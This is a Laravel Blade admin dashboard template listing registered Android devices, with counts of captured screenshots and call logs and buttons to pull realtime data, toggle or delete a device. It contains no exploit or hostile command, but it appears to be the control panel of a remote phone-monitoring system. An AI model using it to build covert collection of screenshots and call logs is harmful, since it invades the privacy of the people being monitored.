@extends('admin.layouts.app')
@section('title', 'Dashboard')
@section('page-title', 'Dashboard')

@section('content')
    <!-- Stats -->
    <div class="stats-grid animate-in">
        <div class="stat-card">
            <div class="stat-icon blue"><i class="fas fa-mobile-screen"></i></div>
            <div class="stat-value">{{ $stats['total_devices'] }}</div>
            <div class="stat-label">Total Devices</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon green"><i class="fas fa-wifi"></i></div>
            <div class="stat-value">{{ $stats['online_devices'] }}</div>
            <div class="stat-label">Online Now</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon purple"><i class="fas fa-camera"></i></div>
            <div class="stat-value">{{ number_format($stats['total_screenshots']) }}</div>
            <div class="stat-label">Total Screenshots</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon orange"><i class="fas fa-phone"></i></div>
            <div class="stat-value">{{ number_format($stats['total_calls']) }}</div>
            <div class="stat-label">Call Logs</div>
        </div>
    </div>

    <!-- Devices Table -->
    <div class="data-table-wrapper animate-in" style="animation-delay: 0.1s">
        <div class="data-table-header">
            <h3><i class="fas fa-mobile-screen" style="margin-right: 8px; color: #6366f1;"></i> Registered Devices</h3>
        </div>

        @if($devices->count() > 0)
        <table>
            <thead>
                <tr>
                    <th>Device</th>
                    <th>Status</th>
                    <th>Battery</th>
                    <th>Screenshots</th>
                    <th>Calls</th>
                    <th>Last Seen</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                @foreach($devices as $device)
                <tr id="device-row-{{ $device->id }}">
                    <td>
                        <div style="display:flex; align-items:center; gap:12px;">
                            <div style="width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,#6366f1,#a855f7);display:flex;align-items:center;justify-content:center;font-size:14px;color:#fff;">
                                <i class="fas fa-mobile-screen"></i>
                            </div>
                            <div>
                                <div style="font-weight:600;font-size:14px;">{{ $device->device_name }}</div>
                                <div style="font-size:12px;color:#64748b;">{{ $device->model }} · Android {{ $device->android_version }}</div>
                            </div>
                        </div>
                    </td>
                    <td>
                        <span class="badge badge-{{ $device->status }}">
                            <i class="fas fa-circle" style="font-size:6px;margin-right:4px;"></i>
                            {{ ucfirst($device->status) }}
                        </span>
                    </td>
                    <td>
                        @if($device->battery_level !== null)
                            <div style="display:flex;align-items:center;gap:6px;">
                                <i class="fas fa-battery-{{ $device->battery_level > 75 ? 'full' : ($device->battery_level > 50 ? 'three-quarters' : ($device->battery_level > 25 ? 'half' : 'quarter')) }}"
                                   style="color:{{ $device->battery_level > 25 ? '#22c55e' : '#ef4444' }}"></i>
                                {{ $device->battery_level }}%
                            </div>
                        @else
                            <span style="color:#64748b;">—</span>
                        @endif
                    </td>
                    <td>{{ $device->screenshots_count }}</td>
                    <td>{{ $device->call_logs_count }}</td>
                    <td>
                        @if($device->last_seen_at)
                            <span title="{{ $device->last_seen_at->format('Y-m-d H:i:s') }}">
                                {{ $device->last_seen_at->diffForHumans() }}
                            </span>
                        @else
                            <span style="color:#64748b;">Never</span>
                        @endif
                    </td>
                    <td>
                        <div style="display:flex;gap:6px;">
                            <a href="{{ route('admin.device.detail', $device) }}" class="btn btn-outline btn-sm btn-icon" title="View Details">
                                <i class="fas fa-eye"></i>
                            </a>
                            <button class="btn btn-primary btn-sm btn-icon" title="Pull Realtime Data" onclick="pullRealtime({{ $device->id }})">
                                <i class="fas fa-download"></i>
                            </button>
                            <button class="btn btn-outline btn-sm btn-icon" title="Toggle Active" onclick="toggleDevice({{ $device->id }})">
                                <i class="fas fa-power-off"></i>
                            </button>
                            <button class="btn btn-danger btn-sm btn-icon" title="Delete Device" onclick="deleteDevice({{ $device->id }})">
                                <i class="fas fa-trash"></i>
                            </button>
                        </div>
                    </td>
                </tr>
                @endforeach
            </tbody>
        </table>
        @else
        <div class="empty-state">
            <i class="fas fa-mobile-screen"></i>
            <p>No devices registered yet. Setup a device to get started.</p>
        </div>
        @endif
    </div>
@endsection

@section('scripts')
<script>
    async function pullRealtime(deviceId) {
        showToast('Sending pull command...', 'info');
        const res = await apiPost(`/admin/devices/${deviceId}/pull-realtime`);
        if (res.success) {
            showToast(res.message, 'success');
        } else {
            showToast(res.message || 'Failed to send command.', 'error');
        }
    }

    async function toggleDevice(deviceId) {
        const res = await apiPost(`/admin/devices/${deviceId}/toggle`);
        if (res.success) {
            showToast(res.message, 'success');
            setTimeout(() => location.reload(), 1000);
        } else {
            showToast(res.message || 'Failed.', 'error');
        }
    }

    async function deleteDevice(deviceId) {
        if (!confirm('Delete this device and ALL its data? This cannot be undone.')) return;
        const res = await apiDelete(`/admin/devices/${deviceId}`);
        if (res.success) {
            showToast(res.message, 'success');
            document.getElementById(`device-row-${deviceId}`).remove();
        } else {
            showToast(res.message || 'Failed.', 'error');
        }
    }
</script>
@endsection
